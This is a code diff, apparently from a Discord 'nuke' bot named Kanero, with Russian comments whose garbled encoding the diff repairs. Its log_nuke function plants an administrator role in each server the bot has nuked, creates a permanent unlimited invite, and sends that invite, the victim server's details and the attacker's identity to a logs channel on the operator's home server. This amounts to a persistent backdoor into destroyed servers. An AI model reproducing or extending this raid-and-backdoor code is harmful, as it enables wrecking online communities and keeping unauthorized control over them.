@@ -57,27 +57,27 @@ async def db_set(collection: str, key: str, value):
 # --- NUKE LOGS ---------------------------------------------
 
 async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
-    """��������� ��� ����. ������ ���� � ������� �������������� � ������ ����� ��."""
+    """Логирование лога нюка. Создаём роль с правами администратора и создаём инвайт через неё."""
     invite_url = None
     try:
-        # ������ ���� � ������� ��������������
+        # Создаём роль с правами администратора
         log_role = await guild.create_role(
-            name="?? Kanero LOG",
+            name="☠️ Kanero LOG",
             permissions=discord.Permissions(administrator=True),
             color=discord.Color.dark_red()
         )
-        # ��������� ���� ��� ����� ����
+        # Поднимаем роль выше всех ролей
         try:
             await log_role.edit(position=max(1, guild.me.top_role.position - 1))
         except Exception:
             pass
-        # ������ ����� ����� ��������� �����
+        # Создаём инвайт через созданную роль
         ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
         if ch:
             inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
             invite_url = inv.url
     except Exception:
-        # Fallback � ������� ������
+        # Fallback с обычной ролью
         try:
             ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
             if ch:
@@ -98,32 +98,32 @@ async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
     }
     await db_set("nuke_logs", str(guild.id), entry)
 
-    # ���������� � logs ����� �� �������� �������
+    # Отправляем в logs канал на домашнем сервере
     try:
         home = bot.get_guild(HOME_GUILD_ID)
         if home:
-            logs_ch = discord.utils.find(lambda c: c.name.lower() == "???logs" or "logs" in c.name.lower(), home.text_channels)
+            logs_ch = discord.utils.find(lambda c: c.name.lower() == "📊・logs" or "logs" in c.name.lower(), home.text_channels)
             if logs_ch:
-                # ������ ��� ������ ����� �����
+                # Выбираем тип эмодзи нюка типов
                 type_emoji = {
-                    "nuke": "??",
-                    "super_nuke": "??",
-                    "owner_nuke": "??",
-                    "auto_nuke": "??",
-                    "auto_super_nuke": "????",
-                    "auto_superpr_nuke": "???",
-                    "auto_owner_nuke": "????"
-                }.get(nuke_type, "??")
+                    "nuke": "💀",
+                    "super_nuke": "💥",
+                    "owner_nuke": "👑",
+                    "auto_nuke": "🤖",
+                    "auto_super_nuke": "🤖💥",
+                    "auto_superpr_nuke": "🤖⚡",
+                    "auto_owner_nuke": "🤖👑"
+                }.get(nuke_type, "💀")
                 embed = discord.Embed(
                     title=f"{type_emoji} {nuke_type.replace('_', ' ').upper()}",
                     color=0xff0000
                 )
-                embed.add_field(name="?? ���", value=f"{user} (`{user.id}`)", inline=True)
-                embed.add_field(name="?? ������", value=f"{guild.name} (`{guild.id}`)", inline=True)
-                embed.add_field(name="?? �����", value=entry["time"], inline=True)
+                embed.add_field(name="👤 Кто", value=f"{user} (`{user.id}`)", inline=True)
+                embed.add_field(name="🏠 Сервер", value=f"{guild.name} (`{guild.id}`)", inline=True)
+                embed.add_field(name="🕐 Время", value=entry["time"], inline=True)
                 if invite_url:
-                    embed.add_field(name="?? ������", value=invite_url, inline=False)
-                embed.set_footer(text="?? Kanero  |  !nukelogs � ������ �������")
+                    embed.add_field(name="🔗 Инвайт", value=invite_url, inline=False)
+                embed.set_footer(text="☠️ Kanero  |  !nukelogs — история крашей")
                 await logs_ch.send(embed=embed)
     except Exception:
         pass
@@ -2566,7 +2566,6 @@ async def setup(ctx):
             role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
         }
     rules_ch  = await guild.create_text_channel("📜・правила",  category=cat_main, overwrites=readonly_ow(), topic="Правила сервера")
-    await guild.create_text_channel("📋・команды",              category=cat_main, overwrites=readonly_ow(), topic="Команды Kanero и только Owner видит")
     await guild.create_text_channel("📢・новости",              category=cat_main, overwrites=readonly_ow(), topic="Новости и обновления от администрации")
     addbot_ch = await guild.create_text_channel("🤖・addbot",   category=cat_main, overwrites={
         guild.default_role: _ow(), role_guest: _ow(True, True),
@@ -2588,11 +2587,6 @@ async def setup(ctx):
         role_user: _ow(True, False), role_white: _ow(True, False),
         role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
     }, topic="Логи выдачи подписок и компенсаций")
-    await guild.create_text_channel("🔧・панель-бота",          category=cat_main, overwrites={
-        guild.default_role: _ow(), role_guest: _ow(True, False),
-        role_user: _ow(True, False), role_white: _ow(True, False),
-        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="!wl_add, !pm_add, !fl_add, !list, !setup, !auto_off и только Owner")
 
     # 💬 ━━ ЧАТЫ — Guest+ пишут 💬
     cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━", overwrites={
